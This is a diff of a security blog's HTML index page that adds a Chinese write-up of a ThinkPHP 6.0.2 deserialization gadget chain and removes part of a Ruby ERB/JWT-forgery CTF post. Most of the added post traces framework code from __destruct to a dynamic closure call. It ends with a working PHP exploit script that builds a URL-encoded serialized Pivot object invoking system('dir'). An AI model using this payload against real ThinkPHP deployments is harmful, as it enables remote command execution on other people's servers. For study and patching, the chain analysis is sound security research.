@@ -114,7 +114,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.86px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.86px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.43px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 12.86px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 12.5px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.5px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.5px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.25px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 13.75px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -171,6 +171,224 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-Thinkphpv6.0.2反序列化链" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/11/10/Thinkphpv6.0.2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" class="article-date">
+  	<time datetime="2021-11-09T16:00:00.000Z" itemprop="datePublished">2021-11-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/10/Thinkphpv6.0.2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">
+        Thinkphpv6.0.2反序列化链
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphpv6-0-2反序列化链"><a href="#Thinkphpv6-0-2反序列化链" class="headerlink" title="Thinkphpv6.0.2反序列化链"></a>Thinkphpv6.0.2反序列化链</h1><p>首先我们把__destruct()作为开头，全局搜索__destruct()，发现在think\Model.php里的__destruct()可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;lazySave) &#123;</span><br><span class="line">        $this-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们需要$this-&gt;lazySave为true，然后看向save，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public function save(array $data = [], string $sequence = null): bool</span><br><span class="line">&#123;</span><br><span class="line">    // 数据对象赋值</span><br><span class="line">    $this-&gt;setAttrs($data);</span><br><span class="line"></span><br><span class="line">    if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#x27;BeforeWrite&#x27;)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">    if (false === $result) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 写入回调</span><br><span class="line">    $this-&gt;trigger(&#x27;AfterWrite&#x27;);</span><br><span class="line"></span><br><span class="line">    // 重新记录原始数据</span><br><span class="line">    $this-&gt;origin   = $this-&gt;data;</span><br><span class="line">    $this-&gt;set      = [];</span><br><span class="line">    $this-&gt;lazySave = false;</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们需要到达</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</span><br></pre></td></tr></table></figure>
+<p>所以我们需要经过一个if，此时需要看向isEmpty()和trigger()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function isEmpty(): bool</span><br><span class="line">&#123;</span><br><span class="line">    return empty($this-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected function trigger(string $event): bool</span><br><span class="line">&#123;</span><br><span class="line">    if (!$this-&gt;withEvent) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>所以如果我们需要绕过第一个if的话，需要$this-&gt;data为空，而$this-&gt;withEvent为false，然后我们绕过第一个if，此时我们看向updateData()和insertData()两个函数，发现updateData()函数有可利用点，所以此时我们需要$this-&gt;exists为true，然后我们看向updateData()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">protected function updateData(): bool</span><br><span class="line">    &#123;</span><br><span class="line">        // 事件回调</span><br><span class="line">        if (false === $this-&gt;trigger(&#x27;BeforeUpdate&#x27;)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;checkData();</span><br><span class="line"></span><br><span class="line">        // 获取有更新的数据</span><br><span class="line">        $data = $this-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">        if (empty($data)) &#123;</span><br><span class="line">            // 关联更新</span><br><span class="line">            if (!empty($this-&gt;relationWrite)) &#123;</span><br><span class="line">                $this-&gt;autoRelationUpdate();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) &#123;</span><br><span class="line">            // 自动写入更新时间</span><br><span class="line">            $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp($this-&gt;updateTime);</span><br><span class="line">            $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 检查允许字段</span><br><span class="line">        $allowFields = $this-&gt;checkAllowFields();</span><br></pre></td></tr></table></figure>
+<p>发现可利用点在checkAllowFields()函数，但是要到达这个函数，需要经过两个if，但是由于前面trigger()为true和$data不为空，所以可以直接到checkAllowFields()函数，我们看向checkAllowFields()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">protected function checkAllowFields(): array</span><br><span class="line">&#123;</span><br><span class="line">    // 检测字段</span><br><span class="line">    if (empty($this-&gt;field)) &#123;</span><br><span class="line">        if (!empty($this-&gt;schema)) &#123;</span><br><span class="line">            $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $query = $this-&gt;db();</span><br><span class="line">            $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable();</span><br><span class="line"></span><br><span class="line">            $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $this-&gt;field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>此时我们发现利用点在$this-&gt;db()，所以我们需要$this-&gt;filed为空且this-&gt;schema为空，但是题目就是这两个为空，所以不用管，所以我们看向$this-&gt;db()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function db($scope = []): Query</span><br><span class="line">&#123;</span><br><span class="line">    /** @var Query $query */</span><br><span class="line">    $query = self::$db-&gt;connect($this-&gt;connection)</span><br><span class="line">        -&gt;name($this-&gt;name . $this-&gt;suffix)</span><br><span class="line">        -&gt;pk($this-&gt;pk);</span><br><span class="line"></span><br><span class="line">    if (!empty($this-&gt;table)) &#123;</span><br><span class="line">        $query-&gt;table($this-&gt;table . $this-&gt;suffix);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们可以看到有字符串拼接，所以我们可以利用来触发toString()，此时我们可以构造$this-&gt;suffix为一个类，我们全局搜索__toString()，发现think\model\concern\Conversion.php里的__toString()可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后看向toJson()，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function toJson(int $options = JSON_UNESCAPED_UNICODE): string</span><br><span class="line">&#123;</span><br><span class="line">    return json_encode($this-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后看向toArray()，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">public function toArray(): array</span><br><span class="line">   &#123;</span><br><span class="line">       $item       = [];</span><br><span class="line">       $hasVisible = false;</span><br><span class="line"></span><br><span class="line">       foreach ($this-&gt;visible as $key =&gt; $val) &#123;</span><br><span class="line">           if (is_string($val)) &#123;</span><br><span class="line">               if (strpos($val, &#x27;.&#x27;)) &#123;</span><br><span class="line">                   [$relation, $name]          = explode(&#x27;.&#x27;, $val);</span><br><span class="line">                   $this-&gt;visible[$relation][] = $name;</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   $this-&gt;visible[$val] = true;</span><br><span class="line">                   $hasVisible          = true;</span><br><span class="line">               &#125;</span><br><span class="line">               unset($this-&gt;visible[$key]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       foreach ($this-&gt;hidden as $key =&gt; $val) &#123;</span><br><span class="line">           if (is_string($val)) &#123;</span><br><span class="line">               if (strpos($val, &#x27;.&#x27;)) &#123;</span><br><span class="line">                   [$relation, $name]         = explode(&#x27;.&#x27;, $val);</span><br><span class="line">                   $this-&gt;hidden[$relation][] = $name;</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   $this-&gt;hidden[$val] = true;</span><br><span class="line">               &#125;</span><br><span class="line">               unset($this-&gt;hidden[$key]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // 合并关联数据</span><br><span class="line">       $data = array_merge($this-&gt;data, $this-&gt;relation);</span><br><span class="line"></span><br><span class="line">       foreach ($data as $key =&gt; $val) &#123;</span><br><span class="line">           if ($val instanceof Model || $val instanceof ModelCollection) &#123;</span><br><span class="line">               // 关联模型对象</span><br><span class="line">               if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) &#123;</span><br><span class="line">                   $val-&gt;visible($this-&gt;visible[$key]);</span><br><span class="line">               &#125; elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) &#123;</span><br><span class="line">                   $val-&gt;hidden($this-&gt;hidden[$key]);</span><br><span class="line">               &#125;</span><br><span class="line">               // 关联模型对象</span><br><span class="line">               if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) &#123;</span><br><span class="line">                   $item[$key] = $val-&gt;toArray();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; elseif (isset($this-&gt;visible[$key])) &#123;</span><br><span class="line">               $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">           &#125; elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">               $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // 追加属性（必须定义获取器）</span><br><span class="line">       foreach ($this-&gt;append as $key =&gt; $name) &#123;</span><br><span class="line">           $this-&gt;appendAttrToArray($item, $key, $name);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return $item;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>此时我们可以看向toArray()函数的这里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">foreach ($data as $key =&gt; $val) &#123;</span><br><span class="line">    if ($val instanceof Model || $val instanceof ModelCollection) &#123;</span><br><span class="line">        // 关联模型对象</span><br><span class="line">        if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) &#123;</span><br><span class="line">            $val-&gt;visible($this-&gt;visible[$key]);</span><br><span class="line">        &#125; elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) &#123;</span><br><span class="line">            $val-&gt;hidden($this-&gt;hidden[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">        // 关联模型对象</span><br><span class="line">        if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) &#123;</span><br><span class="line">            $item[$key] = $val-&gt;toArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; elseif (isset($this-&gt;visible[$key])) &#123;</span><br><span class="line">        $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">    &#125; elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">        $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时我们可以利用这里<br>``<br>$item[$key] = $this-&gt;getAttr($key);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后看向getAttr()函数</span><br></pre></td></tr></table></figure>
+<pre><code>public function getAttr(string $name)
+&#123;
+    try &#123;
+        $relation = false;
+        $value    = $this-&gt;getData($name);
+    &#125; catch (InvalidArgumentException $e) &#123;
+        $relation = $this-&gt;isRelationAttr($name);
+        $value    = null;
+    &#125;
+
+    return $this-&gt;getValue($name, $value, $relation);
+&#125;
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们此时可以利用getValue()函数，而此时$name为$this-&gt;data[$key]中的$key，而$value为</span><br></pre></td></tr></table></figure>
+<p>$value    = $this-&gt;getData($name);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以我们看向getData()函数</span><br></pre></td></tr></table></figure>
+<pre><code>public function getData(string $name = null)
+&#123;
+    if (is_null($name)) &#123;
+        return $this-&gt;data;
+    &#125;
+
+    $fieldName = $this-&gt;getRealFieldName($name);
+
+    if (array_key_exists($fieldName, $this-&gt;data)) &#123;
+        return $this-&gt;data[$fieldName];
+    &#125; elseif (array_key_exists($fieldName, $this-&gt;relation)) &#123;
+        return $this-&gt;relation[$fieldName];
+    &#125;
+
+    throw new InvalidArgumentException(&#39;property not exists:&#39; . static::class . &#39;-&gt;&#39; . $name);
+&#125;
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个函数会返回$this-&gt;data[$key]，因此$value为$this-&gt;data[$key]，然后看向getValue()函数</span><br></pre></td></tr></table></figure>
+<pre><code>protected function getValue(string $name, $value, $relation = false)
+&#123;
+    // 检测属性获取器
+    $fieldName = $this-&gt;getRealFieldName($name);
+    $method    = &#39;get&#39; . Str::studly($name) . &#39;Attr&#39;;
+
+    if (isset($this-&gt;withAttr[$fieldName])) &#123;
+        if ($relation) &#123;
+            $value = $this-&gt;getRelationValue($relation);
+        &#125;
+
+        if (in_array($fieldName, $this-&gt;json) &amp;&amp; is_array($this-&gt;withAttr[$fieldName])) &#123;
+            $value = $this-&gt;getJsonValue($fieldName, $value);
+        &#125; else &#123;
+            $closure = $this-&gt;withAttr[$fieldName];
+            $value   = $closure($value, $this-&gt;data);
+        &#125;
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现我们可以动态函数来执行命令</span><br></pre></td></tr></table></figure>
+<pre><code>            $closure = $this-&gt;withAttr[$fieldName];
+            $value   = $closure($value, $this-&gt;data);
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时只要构造</span><br></pre></td></tr></table></figure>
+<p>$this-&gt;data=[‘b’=&gt;’dir’];<br>$this-&gt;withAttr[‘b’=&gt;’system’];</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">就可以了</span><br><span class="line"></span><br><span class="line">所以根据上面构造exp</span><br></pre></td></tr></table></figure>
+<?php
+
+namespace think;
+
+abstract class Model
+{
+    use model\concern\ModelEvent;
+    use model\concern\Attribute;
+    use model\concern\ModelEvent;
+
+    private $lazySave;
+    private $force;
+    protected $suffix;
+    private $exists;
+    public function __construct($c=''){
+        $this->force=true;
+        $this->lazySave=true;
+        $this->exists=true;
+        $this->suffix=$c;
+    }
+}
+
+namespace think\model\concern;
+
+trait ModelEvent
+{
+    protected $withEvent=false;
+}
+
+
+trait Attribute
+{
+    private $data=['b'=>'dir'];
+    private $withAttr=['b'=>'system'];
+}
+
+
+trait Conversion{
+    protected $visible = ['a' => 'b'];
+}
+
+
+namespace think\model;
+
+use think\Model;
+
+class Pivot extends Model
+{
+
+}
+
+$a=new Pivot();
+$b=new Pivot($a);
+
+echo urlencode(serialize($b));
+?>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注意：由于Conversion使用trait，所以不可以实例化，所以要用继承这个类的类Model，但是Model是接口，所以也不可以实例化，所以我们需要找继承Model类的Pivot()类，但是由于Pivot类调用了两次，所以用这个方法解决</span><br></pre></td></tr></table></figure>
+<p>abstract class Model<br>{<br>    use model\concern\ModelEvent;<br>    use model\concern\Attribute;<br>    use model\concern\ModelEvent;</p>
+<pre><code>private $lazySave;
+private $force;
+protected $suffix;
+private $exists;
+public function __construct($c=&#39;&#39;)&#123;
+    $this-&gt;force=true;
+    $this-&gt;lazySave=true;
+    $this-&gt;exists=true;
+    $this-&gt;suffix=$c;
+&#125;
+</code></pre>
+<p>}</p>
+<p>$a=new Pivot();<br>$b=new Pivot($a);</p>
+<p>```</p>
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/105777872]">https://blog.csdn.net/qq_42181428/article/details/105777872]</a></p>
+<pre><code>[https://www.freesion.com/article/33321065865/]
+</code></pre>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A1%86%E6%9E%B6/" rel="tag">框架</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-Thinkphp5.0.24反序列化链" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -956,130 +1174,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-ruby ERB模板注入以及jwt伪造" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/" class="article-date">
-  	<time datetime="2021-10-16T16:00:00.000Z" itemprop="datePublished">2021-10-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/">
-        ruby ERB模板注入以及jwt伪造
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ruby-ERB模板注入以及jwt伪造"><a href="#ruby-ERB模板注入以及jwt伪造" class="headerlink" title="ruby ERB模板注入以及jwt伪造"></a>ruby ERB模板注入以及jwt伪造</h1><p>打开页面后，发现有一个buy flag，但是钱不够，所以我们尝试抓包</p>
-<p>发现Cookie字段有一个jwt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJlMWFjYmQ3OC01OTNlLTQ4NzYtOTNhZi00ZWNhYmRkZmYyMDQiLCJqa2wiOjIwfQ.1uVjLWKyyci-TEaw7kxUi9vuGvYDgZ1IF3UuvcIcJtU</span><br></pre></td></tr></table></figure>
-<p>打开jwt.io网页，进行解码</p>
-<p>HEADER</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>PAYLOAD</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;uid&quot;: &quot;e1acbd78-593e-4876-93af-4ecabddff204&quot;,</span><br><span class="line">  &quot;jkl&quot;: 20</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>密钥部分不知道，但是我们可以尝试将PAYLOAD中的jkl改为1000000000000000000000000000，来伪造价格，但是密钥不知道，这里爆破的话有点麻烦，但是我们通过目录的扫描，发现robots.txt文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /filebak</span><br></pre></td></tr></table></figure>
-<p>所以访问/filebak，得到ruby语言的源码</p>
